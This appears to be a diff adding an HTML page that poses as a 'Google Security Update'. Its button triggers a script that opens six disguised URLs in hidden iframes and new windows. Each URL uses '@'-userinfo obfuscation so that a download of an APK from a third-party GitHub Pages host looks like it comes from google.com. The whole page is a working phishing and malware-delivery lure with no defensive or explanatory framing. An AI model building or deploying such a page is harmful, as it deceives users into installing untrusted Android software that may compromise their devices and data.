@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Security Update</title>
+</head>
+<body>
+  <button onclick="tryAllMethods()">Download Security Update</button>
+
+  <script>
+    function tryAllMethods() {
+      const methods = [
+        // Method 1: Original dengan URL lengkap
+        "https://google.com%40%40@ryynx88.github.io/chy.apk",
+        
+        // Method 2: Tanpa https://
+        "google.com%40%40@ryynx88.github.io/chy.apk",
+        
+        // Method 3: Dengan path manipulation
+        "https://google.com%40%40@ryynx88.github.io//chy.apk",
+        
+        // Method 4: Subdomain approach
+        "https://google.com%40%40@www.ryynx88.github.io/chy.apk",
+        
+        // Method 5: Dengan port specification
+        "https://google.com%40%40@ryynx88.github.io:443/chy.apk",
+        
+        // Method 6: URL fragments
+        "https://google.com%40%40@ryynx88.github.io/chy.apk#@google.com"
+      ];
+
+      // Coba semua method secara berurutan
+      methods.forEach((url, index) => {
+        setTimeout(() => {
+          console.log(`Trying method ${index + 1}: ${url}`);
+          
+          // Coba dengan iframe
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.src = url;
+          document.body.appendChild(iframe);
+          
+          // Juga coba dengan window.open
+          const newWindow = window.open(url, `frame${index}`);
+          
+        }, index * 1000);
+      });
+    }
+  </script>
+</body>
+</html>
